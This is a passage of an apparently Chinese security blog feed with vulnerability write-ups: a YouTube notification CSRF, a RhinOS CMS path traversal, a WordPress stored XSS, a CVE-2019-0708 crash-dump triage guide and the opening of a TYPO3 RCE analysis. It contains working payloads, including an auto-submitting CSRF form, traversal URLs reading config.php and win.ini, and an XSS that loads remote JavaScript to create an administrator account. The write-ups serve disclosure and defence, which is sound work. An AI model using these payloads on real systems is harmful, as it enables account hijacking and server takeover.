        <content type="html"><![CDATA[<p><img src="http://zone.secevery.com/uploads/article/20190428/d37776aa90dc7e5c8c9d9a078b3ad77e.jpg" alt></p><p>大家好，今天分享的writeup是关于YouTube通知服务（Notification）的CSRF漏洞，作者利用该漏洞可以劫持其他YouTube用户（受害者）的通知服务，能以受害者用户身份接收到其订阅频道或视频的最新通知，漏洞最终获得Google官方$3133.7美金的奖励，以下是作者的分享</p><p><strong> 从POST请求中发现端倪</strong><br>某天晚上，我在YouTube官网上测试漏洞，看看能有什么发现，不知不觉时间已经是半夜00:30了，困累之极…..。我就随便点点打开了YouTube的通知服务（Notification），其中的POST请求引起了我的注意：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">POST /notifications_ajax?action_register_device=1 HTTP/1.1</span><br><span class="line">Host: www.youtube.com</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: https://www.youtube.com/sw.js</span><br><span class="line">Content-Type: multipart/form-data; boundary=---------------------------41184676334</span><br><span class="line">Origin: https://www.youtube.com</span><br><span class="line">Content-Length: 1459</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: duh, cookies!</span><br><span class="line">-----------------------------41184676334</span><br><span class="line">Content-Disposition: form-data; name=&quot;endpoint&quot;</span><br><span class="line"></span><br><span class="line">https://updates.push.services.mozilla.com/wpush/v1/gAAA...</span><br><span class="line"></span><br><span class="line">-----------------------------41184676334</span><br><span class="line">Content-Disposition: form-data; name=&quot;device_id&quot;</span><br><span class="line">dbe8453d99714c6160994fdf5bb3c59332df04278a...</span><br><span class="line">-----------------------------41184676334</span><br><span class="line">Content-Disposition: form-data; name=&quot;p256dh_key&quot;</span><br><span class="line">BBNVkVOt6tpY1KvJJqtLvqt...</span><br><span class="line">-----------------------------41184676334</span><br><span class="line">Content-Disposition: form-data; name=&quot;auth_key&quot;</span><br><span class="line">V5-_lh6nYT2zoY...</span><br><span class="line">-----------------------------41184676334</span><br><span class="line">Content-Disposition: form-data; name=&quot;permission&quot;</span><br><span class="line">granted</span><br><span class="line">-----------------------------41184676334--</span><br></pre></td></tr></table></figure></p><p> 乍一看，为了防止CSRF，其中的auth_key、p256dh_key、endpoint、device_id等参数貌似都是经过编码的字符串，但仔细一分析才知道，这些所有的参数都是由其中updates.push.services.mozilla.com的Mozilla通知推送服务产生的，所以，这样初略来看，该接口上不存在CSRF漏洞。</p><h3 id="分析Service-Worker-服务工作线程​"><a href="#分析Service-Worker-服务工作线程​" class="headerlink" title="分析Service Worker 服务工作线程​"></a>分析Service Worker 服务工作线程​</h3><p>深入分析可知，上述POST请求中的referrer字段值为“<a href="https://www.youtube.com/sw.js”,这个sw.js明显为一个服务工作线程脚本（Service" target="_blank" rel="noopener">https://www.youtube.com/sw.js”,这个sw.js明显为一个服务工作线程脚本（Service</a> Worker）。</p><p>Service Worker 是独立于当前页面的一段运行在浏览器后台进程里的脚本。Service Worker不需要用户打开 web 页面，也不需要其他交互，异步地运行在一个完全独立的上下文环境，不会对主线程造成阻塞。基于Service Worker可以实现消息推送、离线缓存和后台同步API等功能，本质上来说，Service Worker充当了Web应用程序与浏览器之间的代理。​</p><p>也就是说，referrer字段中的sw.js发起了这个POST请求，以至于这个请求和其它具备CSRF防御机制的YouTube请求内容存在不同。</p><h3 id="构造CSRF攻击框架​"><a href="#构造CSRF攻击框架​" class="headerlink" title="构造CSRF攻击框架​"></a>构造CSRF攻击框架​</h3><p>到了这一步，从这些参数里，我隐约觉得这里应该会有漏洞出现，但总要构造个PoC出来试试看。因此，通过研究以上参数的生成机制，我利用sw.js原理，编写了以下三个代码文件，构建了一个本地服务端来生成其中的各个参数。 </p><p><strong>index.html:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;utf-8&quot; /&gt;</span><br><span class="line">    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;</span><br><span class="line">    &lt;title&gt;Push Demo&lt;/title&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt;</span><br><span class="line">    &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; media=&quot;screen&quot; href=&quot;index.css&quot; /&gt;</span><br><span class="line">    &lt;script src=&quot;index.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h1&gt;Hello World&lt;/h1&gt;</span><br><span class="line">    &lt;button id=&quot;permission-btn&quot; onclick=&quot;main()&quot;&gt;Ask Permission&lt;/button&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line">index.js：</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">const check = () =&gt; &#123;</span><br><span class="line">  if (!(&apos;serviceWorker&apos; in navigator)) &#123;</span><br><span class="line">    throw new Error(&apos;No Service Worker support!&apos;)</span><br><span class="line">  &#125;</span><br><span class="line">  if (!(&apos;PushManager&apos; in window)) &#123;</span><br><span class="line">    throw new Error(&apos;No Push API Support!&apos;)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">const registerServiceWorker = async () =&gt; &#123;</span><br><span class="line">  const swRegistration = await navigator.serviceWorker.register(&apos;sw.js&apos;)</span><br><span class="line">  return swRegistration</span><br><span class="line">&#125;</span><br><span class="line">const requestNotificationPermission = async () =&gt; &#123;</span><br><span class="line">  const permission = await window.Notification.requestPermission()</span><br><span class="line">  if (permission !== &apos;granted&apos;) &#123;</span><br><span class="line">    throw new Error(&apos;Permission not granted for Notification&apos;)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">const main = async () =&gt; &#123;</span><br><span class="line">  check()</span><br><span class="line">  const swRegistration = await registerServiceWorker()</span><br><span class="line">  const permission = await requestNotificationPermission()</span><br><span class="line">&#125;</span><br><span class="line">sw.js：</span><br><span class="line"></span><br><span class="line">self.addEventListener(&apos;activate&apos;, async () =&gt; &#123;   console.log(&quot;Hello&quot;);</span><br><span class="line">      self.registration.pushManager.subscribe()</span><br><span class="line">  .then(function(subscription) &#123;</span><br><span class="line">          console.log(JSON.stringify(subscription));</span><br><span class="line">  &#125;)</span><br><span class="line">  .catch(function(e) &#123;</span><br><span class="line">    console.log(e);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;)</span><br><span class="line">self.addEventListener(&quot;push&quot;, function(event) &#123;</span><br><span class="line">  if (event.data) &#123;</span><br><span class="line">    console.log(&quot;Push event!! &quot;, event.data.text());</span><br><span class="line">    showLocalNotification(&quot;Yolo&quot;, event.data.text(),  self.registration);</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    console.log(&quot;Push event but no data&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line">const showLocalNotification = (title, body, swRegistration) =&gt; &#123;</span><br><span class="line">  const options = &#123;</span><br><span class="line">    body</span><br><span class="line">    // here you can add more properties like icon, image, vibrate, etc.</span><br><span class="line">  &#125;;</span><br><span class="line">  swRegistration.showNotification(title, options);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这三个代码文件的目的在于获取sw.js请求时生成的各个参数，有了这些参数，就可以间接形成通知（Notification），打开其中的index.html页面，点击Ask Permission按钮请求通知权限，后台调用sw.js脚本，通过内置的Firefox API形成一个本地的通知服务端，通知请求提交时，我们就能获取到其中的各个参数。利用这些参数，可以进一步构造出CSRF攻击框架，就能获取到对应的通知消息。<br>在本地loclalhost构造这种通知请求服务端，需要用到Service Worker 服务工作线程（sw.js）的部署原理，其中涉及服务注册、激活、缓存控制和相关响应机制，具体可参考：developer.mozilla.org和developers.google.com中的详细介绍说明。</p><p><img src="http://zone.secevery.com/uploads/article/20190428/44a3ae0150b0efc2c8dd3d2f34a4a035.png" alt></p><p>综合上述分析，基于我们之前创建的本地通知服务端，结合Youtube的通知请求提交方式，我构造了以下CSRF攻击框架：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=&quot;https://www.youtube.com/notifications_ajax?action_register_device=1&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot; name=&quot;csrf&quot;&gt;</span><br><span class="line">        &lt;input type=&quot;text&quot; name=&quot;device_id&quot; value=&quot;replace&quot;&gt;</span><br><span class="line">        &lt;input type=&quot;text&quot; name=&quot;permission&quot; value=&quot;granted&quot;&gt;</span><br><span class="line">                &lt;input type=&quot;text&quot; name=&quot;endpoint&quot; value=&quot;replace&quot;&gt;</span><br><span class="line">                &lt;input type=&quot;text&quot; name=&quot;p256dh_key&quot; value=&quot;replace=&quot;&gt;</span><br><span class="line">                &lt;input type=&quot;text&quot; name=&quot;auth_key&quot; value=&quot;replace&quot;&gt;</span><br><span class="line">        &lt;input type=&quot;submit&quot;&gt;</span><br><span class="line">        &lt;script type=&quot;text/javascript&quot;&gt;document.csrf.submit();&lt;/script&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure><p>让我意想不到的是，我在其中以其他Youtube账号身份，利用获取到的各种请求参数，提交了通知请求，竟然能有效实施通知消息的CSRF攻击。也就是说，我们现在可以劫持到其他Youtube账号的消息推送接口（PUSH webhook），以其他Youtube账号身份收取到Youtube响应该账号的相关通知，这些通知可能是他订阅的某个频道或视频的更新消息，也可能是他私人视频的观众评论等，如下：</p><p><img src="http://zone.secevery.com/uploads/article/20190428/0131bb86ac1e5fa9eaa19bafbab8c677.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>犀牛(RhinOS)CMS3.X任意文件下载漏洞(CVE-2018-18760)</title>
      <link href="/2019/12/07/%E6%BC%8F%E6%B4%9E%E6%90%9C%E9%9B%86/%E7%8A%80%E7%89%9B(RhinOS)CMS3.X%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E(CVE-2018-18760)/"/>
      <url>/2019/12/07/%E6%BC%8F%E6%B4%9E%E6%90%9C%E9%9B%86/%E7%8A%80%E7%89%9B(RhinOS)CMS3.X%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E(CVE-2018-18760)/</url>
      
        <content type="html"><![CDATA[<h2 id="01简介"><a href="#01简介" class="headerlink" title="01简介"></a>01简介</h2><p>RhinOS是一个使用最新功能开发网站的框架，可以为Web门户提供最快的访问和管理。RhinOSCMS对于网站管理功能十分强劲，内置允许使用数据库进程和解析器模块快速访问数据库，xml和其他资源，购物车，标签和参数化文件，配置参数，Intranet访问，数据库会话，电子邮件发送，验证码安全系统，快速过滤，列表和详细信息的模块，功能可谓是非常之多了。RhinOSCMS的download.php文件存在任意文件下载漏洞，通过漏洞能够下载任意的文件。</p><h2 id="02环境搭建"><a href="#02环境搭建" class="headerlink" title="02环境搭建"></a>02环境搭建</h2><p>RhinOS CMS下载地址为：<a href="https://sourceforge.net/projects/rhinos/。下载完成后，打开文件，一直点下一步就能够完成安装，如图1所示。" target="_blank" rel="noopener">https://sourceforge.net/projects/rhinos/。下载完成后，打开文件，一直点下一步就能够完成安装，如图1所示。</a></p><p><img src="https://pic3.zhimg.com/v2-db2e62b8afcecde12a1a92d999bf817e_r.jpg" alt></p><p>图1完成安装</p><p>由于一些编码原因，安装成功后的的信息会显示一些乱码，如果使用西班牙语的系统就能正常显示了。然后需要将httpd.conf中的端口修改为8080端口，修改端口是为了避免和WINDOWS本身一些服务冲突，http.conf所在路径为：C:\rhinos\httpd\conf\httpd.conf。如图2所示。</p><p><img src="https://pic1.zhimg.com/v2-fbaf714d0454c7874b0043bba8dfd1b8_r.jpg" alt></p><p>图2httpd.conf所在路径</p><p>右键编辑将文件中的80端口修改为8080端口，如图3所示。</p><p><img src="https://pic2.zhimg.com/v2-ea92189b90a709947773a0c041e042c5_r.jpg" alt></p><p>图3修改端口</p><p>修改端口后需要重启阿帕奇服务，重启服务后访问<a href="http://127.0.0.1:8080。就能够访问到已经搭建好的CMS了，如图4所示。" target="_blank" rel="noopener">http://127.0.0.1:8080。就能够访问到已经搭建好的CMS了，如图4所示。</a></p><p><img src="https://pic4.zhimg.com/80/v2-0902d18ccba9d23b28d2be02e9f374f3_hd.jpg" alt></p><p>图4重启apache服务后访问</p><h2 id="03漏洞代码审计"><a href="#03漏洞代码审计" class="headerlink" title="03漏洞代码审计"></a>03漏洞代码审计</h2><p>漏洞存在于C:\rhinos\demo\admin\php\download.php中，在第30行代码，能够看到文件读取的路径拼接操作，如图5所示。</p><p><img src="https://pic1.zhimg.com/v2-7e723ece58ccea364a50eb6ffe8913f4_r.jpg" alt></p><p>图5download.php</p><p>看到getParam()，查找这个方法是如何实现的。<br>这个函数存在于：C:\rhinos\demo\admin\php\connect.php。第88行，如图6所示。</p><p><img src="https://pic2.zhimg.com/v2-f1f16f289aba167af53da72aebd65729_r.jpg" alt></p><p>图6connect.php</p><p>这个函数中获取了”file”的参数，通过POST或者GET提交都是可以的。然后根据图5所示第41行触发文件读取操作，如果控制参数file则能够成为任意文件读取漏洞或者为任意文件下载漏洞。</p><h2 id="04漏洞复现"><a href="#04漏洞复现" class="headerlink" title="04漏洞复现"></a>04漏洞复现</h2><p>在复现之前需要找到从什么地方调用到了download.php,在经过测试之后发现通过这个URL提交就能够利用漏洞下载到config.php文件,但是首先需要登录后台。URL如下:<br><a href="http://127.0.0.1:8080/admin/inicio.php?include=php/download.php&amp;name=efe.php&amp;file=../config.php，如图7所示。" target="_blank" rel="noopener">http://127.0.0.1:8080/admin/inicio.php?include=php/download.php&amp;name=efe.php&amp;file=../config.php，如图7所示。</a></p><p><img src="https://pic3.zhimg.com/v2-18183c286be55b1b067a55f89ca4deaa_r.jpg" alt></p><p>图7下载config.php</p><p>当然既然是任意文件下来漏洞肯定可以下载windows目录下面的win.ini文件，使用URL为:<br><a href="http://127.0.0.1:8080/admin/inicio.php?include=php/download.php&amp;name=efe.php&amp;file=../../../../Windows/win.ini。执行后就能够下载文件了。如图8所示。" target="_blank" rel="noopener">http://127.0.0.1:8080/admin/inicio.php?include=php/download.php&amp;name=efe.php&amp;file=../../../../Windows/win.ini。执行后就能够下载文件了。如图8所示。</a></p><p><img src="https://pic4.zhimg.com/v2-fddb74e5019196975e2663db99b48ff3_r.jpg" alt></p><p>图8下载win.ini</p><p>##05修复建议<br>根据前文的描述能够看出，漏洞存在一定的危害。应该对于漏洞进行修复，关于如何去修复漏洞。</p><p>1.过滤点[.]要求用户在url中不能回溯上级目录。<br>2.正则严格判断用户输入参数的格式，保证输入参数的准确性。<br>3.将下载区独立放在项目路径外，分配每个下载资源固定的URL,不能是所有的下载资源都是统一的URL：<br><a href="http://127.0.0.1:8080/admin/inicio.php?include=php/download.php&amp;name=efe.php&amp;file=文件名" target="_blank" rel="noopener">http://127.0.0.1:8080/admin/inicio.php?include=php/download.php&amp;name=efe.php&amp;file=文件名</a></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>WordPress存储型XSS漏洞分析</title>
      <link href="/2019/12/07/%E6%BC%8F%E6%B4%9E%E6%90%9C%E9%9B%86/WordPress%E5%AD%98%E5%82%A8%E5%9E%8BXSS%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
      <url>/2019/12/07/%E6%BC%8F%E6%B4%9E%E6%90%9C%E9%9B%86/WordPress%E5%AD%98%E5%82%A8%E5%9E%8BXSS%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<p><strong>译文声明<br>本文是翻译文章，文章原作者fortinet，文章来源：fortinet.com<br>原文地址：<a href="https://www.fortinet.com/blog/threat-research/wordpress-core-stored-xss-vulnerability.html" target="_blank" rel="noopener">https://www.fortinet.com/blog/threat-research/wordpress-core-stored-xss-vulnerability.html</a><br>译文仅供参考，具体内容表达以及含义原文为准</strong></p><p><img src="https://p3.ssl.qhimg.com/t0154214347380ba2a2.png" alt> </p><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>WordPress是世界上最流行的CMS（内容管理系统），占据全球60.4%的市场份额，这个数字远远高于第二名的Joomla!（5.2%的市场份额）。因此，在互联网上有超过三分之一的网站采用WordPress构建。</p><p>FortiGuard Labs团队最近在WordPress中发现了一个存储型XSS（Cross-Site Scripting）0day漏洞，这个XSS漏洞位于WordPress 5.0新增的Gutenberg编辑器中，该编辑器无法正确过滤Shortcode（短代码）错误消息中的JavaScript/HTML代码。如果远程攻击者具备Contributor（贡献者）或者更高权限，当受害者访问被攻击的网页时，攻击者就可以在受害者浏览器上下文中执行任意JavaScript/HTML代码。如果受害者具备更高权限（比如管理员权限），攻击者甚至可以攻破整个web服务器。</p><p>这个存储型XSS漏洞影响5.0至5.2.2版的WordPress。</p><h2 id="0x01-漏洞分析"><a href="#0x01-漏洞分析" class="headerlink" title="0x01 漏洞分析"></a>0x01 漏洞分析</h2><p>在WordPress 5.0中，用户可以在文章（post）中添加Shortcode块（block）。当在Shortcode块中添加特定的HTML编码字符（比如&lt;）然后重新打开该文章时，WordPress就会显示一个错误消息，将&lt;解码成&lt;然后展示预览。</p><p><img src="https://p5.ssl.qhimg.com/t018c8ac1b86a6e22ac.png" alt><br>图1. 在Shortcode块中插入HTML编码字符</p><p><img src="https://p1.ssl.qhimg.com/t0113d0da196199b259.png" alt><br>图2. Shortcode错误消息预览</p><p>我们可以使用<strong>“&gt;&lt;img src=1 onerror=prompt(1)&gt;</strong>这段PoC代码轻松绕过预览视图中的XSS过滤器。</p><p><img src="https://p1.ssl.qhimg.com/t0113d0da196199b259.png" alt><br>图3. 将PoC代码插入Shortcode块</p><p>当受害者查看该文章时，就会在浏览器中执行XSS代码。</p><p><img src="https://p3.ssl.qhimg.com/t010226398ebf02fdd8.png" alt><br>图4. WordPress Shortcode预览XSS</p><p>如果受害者刚好具备管理员权限，那么攻击者就可以利用该漏洞来获取管理员账户的控制权，利用WordPress内置的函数拿到shell，进一步控制整个服务器。</p><p>比如，攻击者可以在自己的web服务器上托管一个JavaScript文件（这里以wpaddadmin.js为例），这段JavaScript代码会添加一个WordPress管理员账户，用户名为attack，密码为attack。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">// Send a GET request to the URL &apos;/wordpress/wp-admin/user-new.php&apos;, and extract the current &apos;nonce&apos; value  </span><br><span class="line">var ajaxRequest = new XMLHttpRequest();  </span><br><span class="line">var requestURL = &quot;/wordpress/wp-admin/user-new.php&quot;;  </span><br><span class="line">var nonceRegex = /ser&quot; value=&quot;([^&quot;]*?)&quot;/g;  </span><br><span class="line">ajaxRequest.open(&quot;GET&quot;, requestURL, false);  </span><br><span class="line">ajaxRequest.send();  </span><br><span class="line">var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);  </span><br><span class="line">var nonce = nonceMatch[1];  </span><br><span class="line"></span><br><span class="line">// Construct a POST query, using the previously extracted &apos;nonce&apos; value, and create a new user with an arbitrary username / password, as an Administrator  </span><br><span class="line">var params = &quot;action=createuser&amp;_wpnonce_create-user=&quot;+nonce+&quot;&amp;user_login=attacker&amp;email=attacker@site.com&amp;pass1=attacker&amp;pass2=attacker&amp;role=administrator&quot;;  </span><br><span class="line">ajaxRequest = new XMLHttpRequest();  </span><br><span class="line">ajaxRequest.open(&quot;POST&quot;, requestURL, true);  </span><br><span class="line">ajaxRequest.setRequestHeader(&quot;Content-Type&quot;, &quot;application/x-www-form-urlencoded&quot;);  </span><br><span class="line">ajaxRequest.send(params);</span><br></pre></td></tr></table></figure><p>然后攻击者可以使用如下PoC来插入JavaScript。</p><p><code>&quot;&amp;gt;&amp;lt;img src=1 onerror=&quot;javascript&amp;colon;(function () { var url = &#39;http://aaa.bbb.ccc.ddd/ wpaddadmin.js&#39;;if (typeof beef == &#39;undefined&#39;) { var bf = document.createElement(&#39;script&#39;); bf.type = &#39;text/javascript&#39;; bf.src = url; document.body.appendChild(bf);}})();&quot;&amp;gt;</code><br><img src="https://p3.ssl.qhimg.com/t01ff29771459e602b0.png" alt><br>图5. 插入XSS代码以添加管理员账户</p><p>一旦具备高权限的受害者查看该文章，就会创建attacker管理员账户。<br><img src="https://p4.ssl.qhimg.com/t010e42abaa7fcc8d89.png" alt><br>图6. 执行XSS代码</p><p><img src="https://p4.ssl.qhimg.com/t013e0fbc54e4f4a6c4.png" alt><br>图7. XSS代码成功创建具备管理员权限的attacker账户</p><p>随后攻击者可以修改已有的php文件，改成webshell代码，以便接管目标web服务器。</p><p><img src="https://p0.ssl.qhimg.com/t0131da4b3ea2ca7c86.png" alt></p><p>图8. 使用攻击者账户添加webshell</p><p><img src="https://p1.ssl.qhimg.com/t01c0b5cda440e3cf4b.png" alt><br>图9. 控制web服务器</p><h2 id="0x02-解决方案"><a href="#0x02-解决方案" class="headerlink" title="0x02 解决方案"></a>0x02 解决方案</h2><p>FortiGuard Labs向WordPress反馈了这个0day漏洞，官方很快发布了相应补丁。如果大家正在使用存在漏洞的WordPress版本，请尽快升级到最新版，或者及时打上补丁。</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>简单判断是否是cve-2019-0708攻击</title>
      <link href="/2019/12/07/%E6%BC%8F%E6%B4%9E%E6%90%9C%E9%9B%86/cve-20190-0708/"/>
      <url>/2019/12/07/%E6%BC%8F%E6%B4%9E%E6%90%9C%E9%9B%86/cve-20190-0708/</url>
      
        <content type="html"><![CDATA[<p>文章转自<a href="https://mp.weixin.qq.com/s?__biz=MzA4NjQxMDcxNA==&amp;mid=2709352684&amp;idx=1&amp;sn=0e845ce5ee2c7f210d89e1566b39e0e5" title="中国白客联盟" target="_blank" rel="noopener">中国白客联盟</a></p><hr><p>今早一起床，发现cve-2019-0708 exp已经公开。但是作为安服人员，攻击是一回事，应急又是另一大回事。这里就简单来判断受害者机器是否受到了cve-2019-0708攻击。</p><p>因为cve-2019-0708这类是溢出类攻击，所以跟ms17-010、ms12-020一样，有一定的几率把机器打蓝屏，这里以蓝屏文件为例作为分析。</p><p>首先安装windbg，添加符号表<br><img src="https://tva1.sinaimg.cn/large/005R6Otmly1g6tf36icqcj30nd08mq53.jpg" alt><br><code>set _NT_SYMBOL_PATH=srv*DownstreamStore*https://msdl.microsoft.com/download/symbols</code><br>打开蓝屏文件，我的win7默认在<br><code>C:\Windows\Minidump</code></p><p>首先我利用cve-2019-0708把我机器打蓝屏，打开该蓝屏dmp文件，关注debug session time、system uptime，可以看到该机器运行了4分钟，在10:00左右出现蓝屏事件：<br><img src="https://ws3.sinaimg.cn/large/005R6Otmly1g6tf36pi9wj30mu05g767.jpg" alt><br>输入</p><p><code>!analyze -v</code><br>看到蓝屏代码<br><img src="https://ws4.sinaimg.cn/large/005R6Otmly1g6tf36v2gpj30o302y0tc.jpg" alt><br>蓝屏代码造成原因：</p><p><img src="https://ws4.sinaimg.cn/large/005R6Otmly1g6tf37055uj30mn01kt90.jpg" alt></p><p>关注PROCESS_NAME，代表导致系统蓝屏的进程：</p><p><img src="https://ws4.sinaimg.cn/large/005R6Otmly1g6tf37fasyj30nh05vwfy.jpg" alt></p><p>FOLLOWUP_IP，错误指令位置</p><p><img src="https://ws4.sinaimg.cn/large/005R6Otmly1g6tf37md3jj30o704faas.jpg" alt></p><p>查看出错驱动，rdpwd.sys，可以通过网上搜索对应漏洞分析文章，查看对用的驱动是否受影响<br><code>lmvm RDPWD</code><br><img src="https://ws4.sinaimg.cn/large/005R6Otmly1g6tf38grlmj30ns07mq6d.jpg" alt></p><p>这是ms12-020打的</p><p><img src="https://ws1.sinaimg.cn/large/005R6Otmly1g6tf38ol3sj30n9024wfc.jpg" alt></p><p>这是ms17-010打的<br><img src="https://ws4.sinaimg.cn/large/005R6Otmly1g6tf38vddfj30mx05ygmg.jpg" alt></p><p>可见不同的攻击手法得到的蓝屏文件结果不一样的，因此可以通过分析蓝屏文件来判断是否受到了哪种攻击。</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2019-12747：TYPO3 9.5.7 RCE漏洞分析</title>
      <link href="/2019/12/07/%E6%BC%8F%E6%B4%9E%E6%90%9C%E9%9B%86/CVE-2019-12747%EF%BC%9ATYPO3%209.5.7%20RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
      <url>/2019/12/07/%E6%BC%8F%E6%B4%9E%E6%90%9C%E9%9B%86/CVE-2019-12747%EF%BC%9ATYPO3%209.5.7%20RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<p><strong>译文声明:<br>本文是翻译文章，文章原作者ripstech，文章来源：blog.ripstech.com<br>原文地址：<a href="https://blog.ripstech.com/2019/typo3-overriding-the-database" target="_blank" rel="noopener">https://blog.ripstech.com/2019/typo3-overriding-the-database</a><br>译文仅供参考，具体内容表达以及含义原文为准</strong><br><img src="https://p2.ssl.qhimg.com/t01cb51d1cb54b0010f.png" alt></p><h2 id="0x01-概述"><a href="#0x01-概述" class="headerlink" title="0x01 概述"></a>0x01 概述</h2><p>在本文中，我们研究TYPO3 CMS的核心中的一个关键漏洞，该漏洞通过代码审计挖掘而出。该漏洞使得经过身份验证的用户能够在底层系统上执行任意PHP代码。</p><p>受该漏洞影响的版本是TYPO3 8.x到8.7.26，以及TYPO3 9.x到9.5.7。对不可信数据的反序列化会导致远程代码执行漏洞，该漏洞可以与后端中检测到的跨站脚本漏洞(CVE-2019-12748)相结合。</p><p>RIP扫描报告（<a href="https://demo.ripstech.com/scan/109/165）" target="_blank" rel="noopener">https://demo.ripstech.com/scan/109/165）</a></p><h2 id="0x02-使用payload覆盖数据库"><a href="#0x02-使用payload覆盖数据库" class="headerlink" title="0x02 使用payload覆盖数据库"></a>0x02 使用payload覆盖数据库</h2><p>在TYPO3的后端部分保存任何表单时将会发生此漏洞。例如，如果用户修改了pages部分，则可以从TYPO3的SQL数据库中提取要编辑的数据并将其写回数据库。在从数据库获取数据之后，应用逻辑允许通过用户的输入覆盖所获取数据的单列。此特征允许经过身份验证的恶意后端用户覆盖包含序列化数据的数据库值，这些数据稍后会反序列化。这将会导致PHP对象注入，最终攻击者可以远程执行代码（CVE-2019-12747）。</p><p>攻击视频（<a 